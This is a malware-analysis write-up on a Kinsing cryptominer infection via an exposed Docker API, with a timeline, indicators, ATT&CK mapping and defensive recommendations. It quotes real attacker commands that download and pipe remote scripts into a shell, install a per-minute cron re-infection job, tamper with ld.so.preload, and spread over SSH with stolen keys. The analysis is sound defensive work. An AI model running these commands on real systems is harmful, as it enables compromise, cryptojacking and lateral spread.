# Investigating a Kinsing Malware Infection on a Linux Server

## 1. Executive Summary

In this investigation, I looked into **Kinsing**, a Linux malware that targets vulnerable servers, especially those running Docker. I wanted to understand how the attack starts, what the attacker does after getting access, and what evidence is left behind on the system. I used information from real security research to rebuild the attack and identify the logs, indicators, and detection opportunities that a SOC analyst should look for.

---

## 2. Scenario

A Linux server was running Docker with its API exposed to the internet without authentication. An attacker found the exposed service and used it to start a malicious container. That container downloaded the Kinsing malware, which then installed itself, created persistence, and started running a cryptocurrency miner in the background. This investigation follows that real attack and analyzes each stage of the compromise.

---

## 3. Investigation Objectives

During this investigation, I wanted to answer these questions:

* How did the attacker get access to the server?
* How was the malware downloaded and executed?
* What changes did it make on the system?
* How did it stay active after a reboot?
* What evidence would appear in Linux logs?
* What detections could help identify this activity?

---

## 4. Attack Overview

The attack started when the attacker found an exposed Docker API. They created a malicious container, which downloaded and ran the Kinsing malware. The malware then installed a cryptocurrency miner, created persistence so it could survive reboots, removed competing miners, and tried to spread to other systems using SSH.

<img width="1006" height="614" alt="1" src="https://github.com/user-attachments/assets/33b992b7-a461-42bb-b300-e0e21dc94483" />


---

# 5. Evidence Analysis

## Initial Access

The attack started through an exposed Docker API. The attacker launched a malicious Ubuntu container using the following command:

```bash
/bin/bash -c apt-get update && apt-get install -y wget cron;service cron start; wget -q -O - 142.44.191.122/d.sh | sh;tail -f /dev/null
```

This command was seen in multiple Kinsing campaigns, with only the download IP changing.

<img width="1102" height="559" alt="first" src="https://github.com/user-attachments/assets/ac4a0dd6-4918-4a41-97ba-c5edff3561c5" />

---

## Payload Download

After the container started, it downloaded and executed the Kinsing loader. In another documented campaign, the download looked like this:

```bash
curl http://185.191.32.198/lh.sh | bash > /dev/null 2>&1
wget -q -O - http://185.191.32.198/lh.sh | bash > /dev/null 2>&1
```

Using both `curl` and `wget` helps the malware run even if one tool is unavailable.

---

## Execution

The loader prepared the system before running the malware. It:

* Disabled SELinux and AppArmor
* Installed missing tools like `curl`, `wget`, and `cron`
* Killed competing miners and monitoring processes
* Removed rival Docker containers

<img width="1012" height="737" alt="2" src="https://github.com/user-attachments/assets/86edcd81-cb65-4792-94eb-aa2947b4feeb" />

---

## Persistence

Kinsing used multiple persistence methods.

**Cron Job**

It created a cron job to download and execute the loader every minute.

```bash
(
  crontab -l 2>/dev/null
  echo "* * * * * $LDR http://185.191.32.198/ex.sh | sh > /dev/null 2>&1"
) | crontab -
```

It also installed a **systemd service** so the malware would restart after a reboot.

---

## Defense Evasion

To avoid detection, Kinsing installed a rootkit by modifying `ld.so.preload`:

```bash
mv /etc/ld.so.preload /etc/ld.so.preload.bak
```

The malware also cleared `.bash_history` and stored its files in hidden directories such as `/tmp`, `/var/tmp`, and `/dev/shm`.

<img width="1113" height="504" alt="3" src="https://github.com/user-attachments/assets/ba99a1ce-bee5-484f-a024-cbdc3885db53" />

---

## Impact

The final payload was the **kdevtmpfsi** cryptominer, which used the server's CPU to mine Monero. It also attempted to spread to other Linux systems over SSH using stolen SSH keys and known hosts.

```bash
ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "sudo curl -L http://217.12.221.244/spr.sh|sh; sudo wget -q -O - http://217.12.221.244/spr.sh|sh;"
```

This allowed the attacker to repeat the infection on other reachable machines.

---

## 6. Attack Timeline

| Time    | Activity                                                           |
| ------- | ------------------------------------------------------------------ |
| T+0     | The attacker found an exposed Docker API and started a container.  |
| T+1     | The `d.sh` script was downloaded and executed.                     |
| T+1     | SELinux and AppArmor were disabled.                                |
| T+2     | The Kinsing malware was downloaded.                                |
| T+3     | A cron job and systemd service were added for persistence.         |
| T+4     | The `kdevtmpfsi` miner started running.                            |
| T+5     | The malware tried to spread to other systems over SSH.             |
| Ongoing | The cron job kept downloading and running the loader every minute. |

---

# 7. Indicators of Compromise (IOCs)

| Type          | Value                                                                |
| ------------- | -------------------------------------------------------------------- |
| IP Addresses  | `142.44.191.122`, `217.12.221.244`, `185.92.74.42`, `185.191.32.198` |
| Scripts       | `d.sh`, `ex.sh`, `lh.sh`, `spr.sh`                                   |
| Rootkit       | `/etc/libsystem.so`                                                  |
| Modified File | `/etc/ld.so.preload`                                                 |
| Processes     | `kinsing`, `kdevtmpfsi`                                              |
| Hidden Paths  | `/tmp/.ICEd-unix`, `/dev/shm/.ICEd-unix`                             |

---

# 8. MITRE ATT&CK Mapping

| Stage             | Technique                                     |
| ----------------- | --------------------------------------------- |
| Initial Access    | **T1190** – Exploit Public-Facing Application |
| Execution         | **T1059.004** – Unix Shell                    |
| Persistence       | **T1053.003** – Cron                          |
| Persistence       | **T1543.002** – Systemd Service               |
| Defense Evasion   | **T1574.006** – Dynamic Linker Hijacking      |
| Defense Evasion   | **T1562.001** – Impair Defenses               |
| Credential Access | **T1552.004** – Unsecured Credentials         |
| Lateral Movement  | **T1021.004** – SSH                           |
| Impact            | **T1496** – Resource Hijacking                |


---

## 9. Recommendations

* Don't expose the Docker API to the internet without authentication.
* Keep Docker, Linux, and internet-facing applications updated with the latest security patches.
* Monitor changes to `/etc/ld.so.preload`, as it's rarely modified by legitimate software.
* Watch for new cron jobs or unexpected systemd services.
* Investigate unusual CPU usage, especially if no legitimate process explains it.
* If a server is compromised, isolate it and rebuild it instead of trying to clean the infection.

---

## 10. Conclusion

This investigation showed how quickly a small misconfiguration can lead to a full system compromise. After getting access, Kinsing installs a cryptominer, creates persistence, and attempts to spread to other systems over SSH. It also tries to avoid detection by disabling security features and hiding its activity. Monitoring key system files, cron jobs, and unusual processes can help detect this type of attack much earlier.

---

## 11. References

Aqua Security – Kinsing Malware Attacks Targeting Container Environments

Aqua Security – Kinsing Malware Exploits Novel Openfire Vulnerability

Sandfly Security – Log4j Kinsing Linux Malware Analysis

MITRE ATT&CK


